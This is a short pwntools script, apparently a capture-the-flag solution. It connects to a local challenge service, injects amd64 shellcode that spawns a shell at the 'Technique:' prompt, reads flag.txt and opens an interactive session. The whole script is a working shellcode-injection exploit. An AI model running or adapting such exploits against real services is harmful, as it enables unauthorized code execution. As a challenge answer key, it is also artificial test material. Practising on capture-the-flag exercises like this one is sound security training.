from pwn import *

context.arch = "amd64"
p = remote("localhost", 1349)
p.sendafter(b"Technique: ", asm(shellcraft.sh()))
p.recvuntil(b"Evaluation begins. Expectations remain manageable.\n")
p.sendline(b"cat flag.txt")
p.interactive()
